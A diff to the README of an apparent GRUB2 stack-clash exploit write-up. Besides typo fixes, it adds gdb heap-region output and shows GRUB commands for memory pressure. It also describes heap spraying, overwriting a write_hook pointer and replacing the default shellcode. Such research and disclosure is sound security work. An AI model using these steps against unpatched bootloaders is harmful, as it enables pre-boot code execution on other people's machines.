@@ -1,6 +1,6 @@
 # ClashGPT - bah / January 2025
 
-This is an exploit for a bug in GRUB2 that was fixed in January 2025.
+This is an exploit for a bug in GRUB2 that was fixed in February 2025.
 It was found, reported and patched by me.
 It is a technically interesting bug in how you exploit it, requiring determining
 alignment to gain reliable control over a target object.
@@ -197,7 +197,7 @@ We need to perform the following steps:
 
 ### Applying Pressure
 
-Something like the following works to apply memory presure:
+Something like the following works to apply memory pressure:
 ```
 set a=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 set a=${a}${a}${a}${a}${a}${a}${a}${a}
@@ -221,6 +221,42 @@ Looking at RSP compared to the region and seeing how far we are away:
 RSP - (region + size)
 0xbff10518 - (0xbfe00000+987072) = 128344
 ```
+
+If I run the `mm_regions` command from my gdb script:
+```
+region: 0xbe3d5000
+- size: 12224
+- first: 0xbe3d5b00
+- next: 0x808000
+- pre_size: 0
+- post_size: 0
+
+region: 0x808000
+- size: 12224
+- first: 0x809cc0
+- next: 0x80c000
+- pre_size: 0
+- post_size: 0
+
+region: 0x80c000
+- size: 16320
+- first: 0x80c040
+- next: 0xbfe00000
+- pre_size: 0
+- post_size: 0
+
+region: 0xbfe00000
+- size: 987072
+- first: 0xbfe00040
+- next: 0xbdfcd000
+- pre_size: 0
+- post_size: 0
+
+[more omitted]
+```
+So we have several regions before the regions below the stack, so smaller
+allocations should go to those first.
+(notice 32KB won't fit in any of the smaller ones)
 
 ### Probing the Construction and Aligning
 
@@ -271,7 +307,7 @@ We can spray this specific structure by just defining new variables.
 If we set their names and values to be large, we can avoid them ending up in our
 free()'d block.
 
-Once we've sprayed(), we just trigger our overwrite again but with a different
+Once we've sprayed, we just trigger our overwrite again but with a different
 chain that sets name to NULL and the write_hook to a sprayed address.
 Then we can `set =1` and take control.
 
@@ -303,7 +339,7 @@ error: no such device: does_not_exist.
 The default payload is just an infloop (EB FE), change that (`SHELLCODE` in
 `src/consts.py`) if you want anything more.
 
-## Futher Reading
+## Further Reading
 
 * https://web.archive.org/web/20050817190326/http://cansecwest.com/core05/memory_vulns_delalleau.pdf -
   if you care about stack clashes, these slides are old but good. 
